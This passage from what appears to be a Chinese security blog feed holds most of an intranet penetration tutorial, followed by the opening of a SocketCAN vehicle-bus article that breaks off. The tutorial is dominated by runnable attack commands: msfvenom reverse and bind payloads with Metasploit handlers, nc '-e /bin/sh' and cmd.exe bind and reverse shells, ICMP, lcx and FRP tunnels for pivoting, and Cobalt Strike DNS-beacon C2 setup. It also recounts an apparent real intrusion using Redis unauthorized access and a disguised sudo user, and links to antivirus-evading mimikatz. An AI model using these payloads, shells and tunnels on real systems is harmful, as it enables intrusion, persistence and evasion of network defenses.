/></p><p>先注册一个账号，然后选择一个免费的服务器（现在要付费认证，认证还要付费，绝了，不用了，拜拜），选择http流量转发，假设本地端口192.168.80.137:4444，即内网Kali，内网的win7执行后门后，经过服务器转发到我们的Kali。</p><p>启动Ngrok：<code>./sunny clientid 隧道号</code></p><p>然后在本机生成一个http木马（流量端口为80)传入到受害主机并且触发，注意，改木马的地址为我们服务器的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.80.137</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后kali开启监听即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.80.137</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="frp同样可以配合proxychain"><a class="markdownIt-Anchor" href="#frp同样可以配合proxychain"></a> FRP（同样可以配合proxychain）</h3><ul><li>FRP说明文档：<a href="https://gofrp.org/docs/examples/">https://gofrp.org/docs/examples/</a></li><li><a href="https://github.com/fatedier/frp/releases/tag/v0.42.0">Release v0.42.0 · fatedier/frp (github.com)</a></li><li>参考：<a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></li><li>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。</li></ul><h4 id="服务端设置"><a class="markdownIt-Anchor" href="#服务端设置"></a> 服务端设置</h4><p>服务器修改配置文件 frps.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>启动服务端：<code>./frps -c ./frps.ini</code></p><h4 id="控制端设置"><a class="markdownIt-Anchor" href="#控制端设置"></a> 控制端设置</h4><p>配置文件 frpc.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机 ip</span><br><span class="line">server_port = 7000 #frpc 工作端口，必须和上面 frps 保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555 #转发给本机的 5555</span><br><span class="line">remote_port = 6000 #服务端用 6000 端口转发给本机</span><br></pre></td></tr></table></figure><p>启动客户端：<code>./frpc -c ./frpc.ini</code></p><h4 id="后门生成-运行-反弹接受"><a class="markdownIt-Anchor" href="#后门生成-运行-反弹接受"></a> 后门生成、运行、反弹接受</h4><p>与上面的方法一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=你的云主机ip lport=6000 -f exe -o frp.exe</span><br></pre></td></tr></table></figure><p>然后配置监听即可</p><h4 id="自己搭建的外网代理"><a class="markdownIt-Anchor" href="#自己搭建的外网代理"></a> 自己搭建的外网代理</h4><p>在外网主机上传一个frps，而自己这里搭建一个frpc，这样所有特定流量都会转发到frps上，frpc设置的是127.0.0.1，设置端口，就OK了</p><h3 id="三层穿透proxychainsocks4a路由"><a class="markdownIt-Anchor" href="#三层穿透proxychainsocks4a路由"></a> 三层穿透——ProxyChain+Socks4a+路由</h3><h4 id="拓扑图"><a class="markdownIt-Anchor" href="#拓扑图"></a> 拓扑图</h4><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f37302d322e706e67.png" alt="70-2" /></p><p>我们的目标很明确，就是获取三个flag，分别在target1/2/3中。</p><p>参考：</p><ul><li><a href="https://www.cnblogs.com/zhengna/p/15348419.html">https://www.cnblogs.com/zhengna/p/15348419.html</a></li><li><a href="https://blog.csdn.net/qq_42383069/article/details/123576958">https://blog.csdn.net/qq_42383069/article/details/123576958</a></li><li><a href="https://hackergu.com/cfs-network/">https://hackergu.com/cfs-network/</a></li><li>CFS三层靶机环境： 链接: <a href="https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg">https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg</a> 提取码: dkcp 解压密码：<a href="http://teamssix.com">teamssix.com</a></li></ul><h4 id="攻击路线"><a class="markdownIt-Anchor" href="#攻击路线"></a> 攻击路线</h4><ol><li><p>攻击最外层，获得shell（thinkphp rce+一句话木马）</p><ol><li><p>经过各种方式获得shell之后需要进行信息搜集以及路由设置，但是我们首先是不知道有内网而且是什么网段的。</p><ol><li><p>后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br></pre></td></tr></table></figure></li><li><p>接受：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.128</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li><li><p>进行网卡的扫描，并添加路由，可以使用ifconfig或者在meterpreter上使用：</p><ol><li><p>获取网络接口：<code>run get_local_subnets</code></p></li><li><p>查看路由地址：<code>run autoroute -p</code></p></li><li><p>如果没有对应内网的那个路由，那就添加：<code>run autoroute -s 192.168.22.0/24</code>。</p><p>这里添加完后，就相当于以我们能在外网访问到的网址作为网关，进行转发流量，到我们的kali上的Msf。但是这样只能在msf上使用，所以需要在本机kali上开一个端口，作为代理，转发流量到我们的端口上，这时候需要ProxyChain+Socks4a配合</p></li></ol></li><li><p>ProxyChain+Socks4a配合完成代理【注：如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。】</p><ol><li><p>开启本机代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvport 2222</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>配置proxychains：找到proxychains.conf文件，linux是/etc/proxychains.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks4 192.168.80.137 2222</span><br></pre></td></tr></table></figure></li><li><p>运行proxychains，用nmap扫描（注意这个socks转发http/tcp协议的流量）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.22.0/24</span><br><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 //这里是为了快速扫描</span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure><p>我们访问内网服务的时候，浏览器设置代理：</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704220840773.png" alt="image-20230704220840773" /></p></li></ol></li></ol></li><li><p>当我们上传了木马到第二台主机，那么我们去用蚁剑连接的时候需要设置代理：</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704221716634.png" alt="image-20230704221716634" /></p></li><li><p>当我们拿到第二台主机，对第三台主机进攻，我们很多漏洞扫描工具又可以派上用场，例如：namp --script=all、namp --script=vuln、nessus，设置代理即可。</p></li><li><p>步骤差不多~over，自己试验。</p></li></ol><h3 id="nps更强大的web代理"><a class="markdownIt-Anchor" href="#nps更强大的web代理"></a> NPS（更强大的web代理）</h3><p><a href="https://teamssix.com/210612-213704.html">https://teamssix.com/210612-213704.html</a></p><p>下载：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><h2 id="隧道"><a class="markdownIt-Anchor" href="#隧道"></a> 隧道</h2><p>主要解决：</p><ul><li>防火墙过滤问题、网络连接通信问题、数据回链封装问题</li><li>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。比如CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等问题，都可以通过隧道技术解决。</li></ul><p>需要特别注意的是：</p><ul><li>在用隧道之前要先探测对应隧道协议是否支持，如果不支持，用这个隧道也没有任何意义！</li></ul><p>它与代理的区别：</p><ul><li>代理通过转发tcp包出去，但是防火墙会对这些包进行拦截，我们可以伪装这些tcp包为icmp包【封装】再转发出去，这样就可以躲过监控。</li></ul><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><ul><li>隧道，就是一种绕过端口屏蔽的通信方式。</li><li>防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</li></ul><h3 id="常用的隧道技术"><a class="markdownIt-Anchor" href="#常用的隧道技术"></a> 常用的隧道技术</h3><ul><li>网络层：IPv6隧道、ICMP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTS隧道、DNS隧道</li></ul><p>涉及到OSI七层与TCP/IP 五层或者四层协议</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f37312e706e67.png" alt="img" /></p><h3 id="探测使用隧道类型"><a class="markdownIt-Anchor" href="#探测使用隧道类型"></a> 探测使用隧道类型</h3><p>隧道有各种层面的，每个层面又分不同协议，你想要用哪个隧道，就需要先确定目标主机是否支持对应隧道协议。</p><p>可以使用以下协议进行判断。</p><ul><li>ICMP协议：ping：<code>ping www.baidu.com</code></li><li>TCP协议：telnet\nc：<code>telnet  www.baidu.com  80</code>,<code>nc -zv www.baidu.com 80 </code>【z为扫描不发送数据包，v表示详细输出】</li><li>HTTP协议：curl\wget：<code>curl www.baidu.com 80</code>,<code>wget -S www.baidu.com</code></li><li>DNS协议：nslookup\dig：<code>nslookup www.baidu.com</code>,<code>dig www.baidu.com</code>【这两个分别是win和linux自带的】</li></ul><h3 id="网络层-icmp-隧道-ptunnelpingtunnel-使用"><a class="markdownIt-Anchor" href="#网络层-icmp-隧道-ptunnelpingtunnel-使用"></a> 网络层 ICMP 隧道 <a href="https://github.com/f1vefour/ptunnel">ptunnel</a>/<a href="https://github.com/esrrhs/pingtunnel">Pingtunnel</a> 使用</h3><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具 为什么要转换？因为tcp、udp、sock5这几个协议受到防火墙和工具的拦截，这个工具就是把这些流量伪装成icmp进行数据传输！</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p ##表示连接icmp隧道另一端的机器IP（即目标服务器）</span><br><span class="line">-lp##表示需要监听的本地tcp端口</span><br><span class="line">-da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）</span><br><span class="line">-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span><br><span class="line">-x##设置连接的密码</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># target2执行</span><br><span class="line">./ptunnel -x xiaodi </span><br><span class="line"></span><br><span class="line"># kali执行</span><br><span class="line">./ptunnel -p 192.168.80.145 -lp 1080 -da 192.168.33.33 -dpd 3389 -x xiaodi # 转发的3389请求数据给本地1080。相当于端口映射，将3389端口映射到1080端口并通过icmp封装，后面只要访问1080就是访问3389</span><br><span class="line">rdesktop 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>实验准备：<a href="https://blog.csdn.net/markecheng/article/details/110352161">https://blog.csdn.net/markecheng/article/details/110352161</a></p><h3 id="传输层隧道-lcxwinportmaplinux-使用"><a class="markdownIt-Anchor" href="#传输层隧道-lcxwinportmaplinux-使用"></a> 传输层隧道 <a href="https://github.com/MrAnonymous-1/lcx">lcx[win]</a>/portmap[linux] 使用</h3><p>lcx是一个端口转发工具，通过端口转发的形式，将内网服务器的某一个端口映射到公网另一台服务器的一个端口上去</p><p>例如在<strong>内网主机</strong>中使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lcx.exe -slave 192.168.3.31 6666 127.0.0.1 3389 //将本地3389给webserver的6666</span><br></pre></td></tr></table></figure><p>这样，外网主机就可以通过自己的6666端口访问3389了。<strong>外网webserver</strong>监听并转发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lcx.exe -listen 6666 7777   // 监听6666转发至7777</span><br></pre></td></tr></table></figure><p>在<strong>内网kali</strong>上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.80.146:7777</span><br></pre></td></tr></table></figure><h3 id="传输层隧道转发nc流量"><a class="markdownIt-Anchor" href="#传输层隧道转发nc流量"></a> 传输层隧道——转发nc流量</h3><h4 id="正向shell连接受害者"><a class="markdownIt-Anchor" href="#正向shell连接受害者"></a> 正向shell（连接受害者）</h4><p>受害者执行（监听，听到谁，就给shell）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ldp 1234 -e /bin/sh #linux</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe  #windows</span><br></pre></td></tr></table></figure><p>攻击，我主动连接：<code>nc 192.168.76.132 1234</code></p><h4 id="反弹shell受害者连我"><a class="markdownIt-Anchor" href="#反弹shell受害者连我"></a> 反弹shell（受害者连我）</h4><p>攻击，受害者连我</p><p>我监听：<code>nc -lvp 1234</code></p><p>受害者执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.3.32 1234 -e /bin/sh</span><br><span class="line">nc 192.168.3.32 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure><h4 id="多向连接反弹-shell-配合转发"><a class="markdownIt-Anchor" href="#多向连接反弹-shell-配合转发"></a> 多向连接反弹 shell-配合转发</h4><p>假设有三个主机，webserver连外网，内网有一台pc，kali在外网</p><p>我们通过上面的方法将端口转发：</p><p>pc：<code>nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</code></p><p>webserver：<code>Lcx.exe -listen 2222 3333</code></p><p>kali：<code>nc -v 192.168.80.146 3333</code></p><p>kali能够和webserver联通，可以直接接收3333的shell，间接的取得了sqlserver的权限</p><h4 id="其他功能"><a class="markdownIt-Anchor" href="#其他功能"></a> 其他功能</h4><p>指纹服务：<code>nc -nv 192.168.76.143</code></p><p>端口扫描：<code>nc -v -z 192.168.76.143 1-100</code></p><p>端口监听：<code>nc -lvp xxxx</code></p><p>文件传输：<code>nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</code></p><h3 id="应用层dns隧道配合cs上线"><a class="markdownIt-Anchor" href="#应用层dns隧道配合cs上线"></a> 应用层DNS隧道——配合CS上线</h3><h4 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h4><p>核心思想：<strong>端口不和服务绑定，可以传输任何数据</strong>。</p><p>正常网络之间的通信，是发生在两台机器建立TCP连接之后的，在进行通信时：如果目标是IP，则会直接发送报文，如果是域名，则将域名解析为IP再通信。C&amp;C服务器在建立连接后将指令传递给客户端上的后门程序。</p><p>DNS隧道的原理就是：在后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，<strong>就会访问互联网进行查询</strong>，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，<strong>但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令，从而将其他协议封装在DNS协议中进行传输</strong>。</p><p>参考：</p><ul><li><a href="https://www.cnblogs.com/HighnessDragonfly/p/14631308.html">dns隧道攻击原理及常用工具流量分析</a></li></ul><h4 id="操作-2"><a class="markdownIt-Anchor" href="#操作-2"></a> 操作</h4><p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p><p>CS上有DNS Beacon，可以使用它完成隧道。有Teamserver，部署在云端，这时候：</p><ol><li><p>Teamserver就需要启用53端口UDP</p></li><li><p>买一个域名，修改解析记录如下：</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704234352966.png" alt="image-20230704234352966" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure></li><li><p>配置DNS监听内容：<code>ns1.xiaodi8.com、ns2.xiaodi8.com——&gt;cs.xiaodi8.com</code></p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704234319405.png" alt="image-20230704234319405" /></p></li><li><p>生成后门，执行上线后启用命令：<code>attacks--&gt;packages--&gt;windows executable(s)--&gt;listener</code></p><p>选择dns上线，勾选–&gt;选择后门生成位置–&gt;生成后门。将后门上传到webserver，执行。执行后门后，cs出现一个黑窗口。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704234142908.png" alt="image-20230704234142908" /></p><p>点击小图标，出现unknown主机，原因是我们使用DNS上线，DNS速度特别慢。此时我们需要再敲几条命令才能实现控制。点击unknown主机，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkin</span><br><span class="line">mode dns-txt</span><br><span class="line">shell whoami</span><br></pre></td></tr></table></figure></li></ol><h1 id="cs与msf联动"><a class="markdownIt-Anchor" href="#cs与msf联动"></a> CS与MSF联动</h1><h2 id="cs到msf"><a class="markdownIt-Anchor" href="#cs到msf"></a> CS到MSF</h2><ul><li><p>CS创建监听listen</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095001864.png" alt="image-20230705095001864" /></p></li><li><p>CS产生木马，运行之后在CS上线</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095023212.png" alt="image-20230705095023212" /></p></li><li><p>CS添加一个新的监听器，用来传递给msf。由于生成的木马就是HTTP的，所以委派给msf时，监听器还是HTTP的。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095105503.png" alt="image-20230705095105503" /></p></li><li><p>CS委派对话</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095208450.png" alt="image-20230705095208450" /></p></li><li><p>MSF准备接受</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095150443.png" alt="image-20230705095150443" /></p></li></ul><h2 id="msf到cs"><a class="markdownIt-Anchor" href="#msf到cs"></a> MSF到CS</h2><p>msf在拿到session之后，使用<code>exploit/windows/local/payload_inject</code>模块来指明接收者的 ip 和端口，然后把session委派出去。</p><ol><li>MSF选择session，使用模块：<code>use exploit/windows/local/payload_inject</code>，并设置相关payload信息。主要是端口，run即可<ul><li>lport写的是cs监听端口</li><li>lhost写的是cs主机ip</li></ul></li><li>CS使用监听器，监听一个端口，8即可</li></ol><h1 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h1><p>内网横向肯定得 fscan 出场了，一般刚开始就扫个 C 段就行了，好巧不巧，发现了我最喜欢的 Redis 未授权，进去发现还是 root 用户，但是不出网。</p><p>这种情况我一般会创建一个 sudo 免密的新用户，就 adduser 然后 visudo 就可以了，用户名字起地别太假。</p><p>然后在出网的机器用 nps 搭一个隧道出来，服务端提前配好，客户端就三句话的事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com//ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz</span><br><span class="line">tar -zxvf linux_amd64_client.tar.gz</span><br><span class="line">nohup ./npc -server=xxx.xxx.xxx.xxx:xxx -vkey=xxx &gt; npc.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>然后继续内网扫描，首先用扫描器的 icmp 模块看看内网有多大，然后再扫。</p><p>内网不大，就两个 C 段资产比较多。</p><p>我一般习惯先拿非 web 资产，最后再看 web 资产。</p><p>首先把所有的 redis 未授权和弱口令都利用了，一共拿到大约 12 台机器，然后进去翻 web 服务的配置文件，把数据库密码找到，发现几个经常用的强口令，补充到扫描器里接着爆扫数据库和服务器。</p><p>涉及到的服务器与内容：</p><ol><li><p>OA系统</p></li><li><p>WEB服务：nacos的服务</p></li><li><p>生产系统：Solr，elasticsearch，Flink，Sentinel</p></li><li><p>LDAP 服务的管理端，管控着 jira、jenkins 等服务</p></li></ol><h1 id="资源下载"><a class="markdownIt-Anchor" href="#资源下载"></a> 资源下载</h1><ul><li><p>K8Tools，K8哥哥的工具库：<a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p></li><li><p><a href="https://github.com/gentilkiwi/kekeo/">https://github.com/gentilkiwi/kekeo/</a></p></li><li><p><a href="https://github.com/k8gege/Ladon/releases">k8gege/Ladon: 大型内网渗透扫描器</a></p><p>解压密码：<a href="http://k8gege.org">k8gege.org</a></p></li><li><p><a href="https://github.com/ianxtianxt/MS14-068/blob/master/MS14-068.exe">https://github.com/ianxtianxt/MS14-068/blob/master/MS14-068.exe</a></p></li><li><p>暗月免杀mimikatz 链接：<a href="https://pan.baidu.com/s/1erHWNWQ6roVWTKNkdWsffg?pwd=uy5q">https://pan.baidu.com/s/1erHWNWQ6roVWTKNkdWsffg?pwd=uy5q</a> 提取码：uy5q</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; 概念&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%9</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="内网" scheme="https://j3f5.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>车联网基础-SocketCAN与车辆通信</title>
    <link href="https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/"/>
    <id>https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/</id>
    <published>2023-06-20T01:38:06.000Z</published>
    <updated>2023-06-20T01:38:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解这些之后，我们需要了解各个can连接器，这些链接器可以链接测试CAN总线，后面配合CAN-utils就可以对CAN数据进行读取了。</p><h2 id="连接器"><a class="markdownIt-Anchor" href="#连接器"></a> 连接器</h2><h3 id="vector-canlin-interface"><a class="markdownIt-Anchor" href="#vector-canlin-interface"></a> Vector CAN/LIN interface</h3><h2 id="can-utils"><a class="markdownIt-Anchor" href="#can-utils"></a> can-utils</h2><p>打开kali，安装can-utils：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install can-utils</span><br></pre></td></tr></table></figure><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><h2 id="标准测试"><a class="markdownIt-Anchor" href="#标准测试"></a> 标准测试</h2><ol><li><p>安装完CAN-utils，则需配置芯片组</p><ol><li>安装CAN嗅探器对应的驱动，确保设备兼容</li><li>对适配器进行初始化</li><li>使用<code>dmesg</code>查看初始化信息</li></ol></li><li><p>查看接口是否存在（接口是否被正确加载）：<code>ifconfig can0</code></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620111945142.png" alt="image-20230620111945142" /></p></li><li><p>设置总线速率，要设置的关键参数是<strong>比特率(bitrate)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set can0 type can bitrate 500000</span><br><span class="line">ip link set up can0</span><br></pre></td></tr></table></figure><p>这样就启动can0设备了，然后就可以使用can-utils进行连接接口了。</p></li><li><p>Linux使用<strong>netlink</strong>在内核和用户空间工具间进行通信，可以通过<code>ip link</code>访问netlink。相关命令可以看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip link set can0 type can help</span><br></pre></td></tr></table></figure><p>注：内置设备复位（数据包丢失/错误时使用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set canX type can restart-ms 100</span><br><span class="line">ip link set canx type can restart</span><br></pre></td></tr></table></figure></li><li><p>配置串行设备</p><p>要使用USB转串口适配器，必须首先出水啊串口硬件和CAN总线波特率：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slcand -o -s6 -t hw -S 3000000 /dev/ttyUSB0</span><br><span class="line">ip link set up slcan0</span><br></pre></td></tr></table></figure><p>slcand守护进程提供了将串口通信转译到网络驱动程序slcan0所欲的接口，注意<code>-s</code>选项即为波特率，具体参考：</p><ul><li><a href="https://blog.csdn.net/weifengdq/article/details/128823317">https://blog.csdn.net/weifengdq/article/details/128823317</a></li></ul></li></ol><h2 id="虚拟"><a class="markdownIt-Anchor" href="#虚拟"></a> 虚拟</h2><p>配置一个虚拟CAN网络用于测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">modprobe vcan</span><br><span class="line">demsg | grep vcan</span><br><span class="line">ip link add dev vcan0 type vcan</span><br><span class="line">ip link set up vcan0</span><br><span class="line">ifconfig vcan0</span><br></pre></td></tr></table></figure><h2 id="icsim"><a class="markdownIt-Anchor" href="#icsim"></a> ICSim</h2><p>ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。</p><p>GITHUB地址：<a href="https://github.com/zombieCraig/ICSim">https://github.com/zombieCraig/ICSim</a><br />安装参考：<a href="https://www.anquanke.com/post/id/209141">https://www.anquanke.com/post/id/209141</a></p><h1 id="工具与套件"><a class="markdownIt-Anchor" 